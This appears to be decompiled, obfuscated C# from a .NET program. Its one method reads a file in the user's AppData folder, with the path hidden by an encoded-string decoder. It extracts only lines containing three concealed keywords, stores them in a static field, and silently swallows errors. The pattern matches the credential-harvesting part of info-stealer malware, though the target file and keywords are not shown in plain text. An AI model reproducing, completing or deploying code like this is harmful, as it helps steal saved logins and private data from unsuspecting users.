using System;
using System.Diagnostics;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns1;

internal sealed class Class31
{
	public class Class32
	{
		[DebuggerNonUserCode]
		public Class32()
		{
		}

		public void method_0()
		{
			try
			{
				string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class9.smethod_0("hnPAzLuasbWzqo2ov8y3nrh+z7aWHQ==", "False");
				string text2 = Conversions.ToString(1);
				text2 = ((ServerComputer)Class1.smethod_0()).get_FileSystem().OpenTextFileReader(text).ReadToEnd();
				string text3 = Class9.smethod_0("aYSPlohphI+WiGmEosKykLDAlohphI+WiGmEj5aIaYQc", "False") + "\r\n\r\n";
				string[] array = text2.Split(new char[1] { '\r' });
				text2 = null;
				string[] array2 = array;
				foreach (string text4 in array2)
				{
					if (text4.Contains(Class9.smethod_0("d8bT186qudDUmAs=", "False")))
					{
						text3 = text3 + text4 + "\r\n";
					}
					if (text4.Contains(Class9.smethod_0("Y7CuwatlIA==", "False")))
					{
						text3 = text3 + text4 + "\r\n";
					}
					if (text4.Contains(Class9.smethod_0("dMO/2MqvwtDJlQ4=", "False")))
					{
						text3 = text3 + text4 + "\r\n\r\n";
					}
				}
				string_0 = text3 + "\r\n\r\n" + Class9.smethod_0("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4Ie", "False");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string_0 = "";
				ProjectData.ClearProjectError();
			}
		}
	}

	public static string string_0;
}
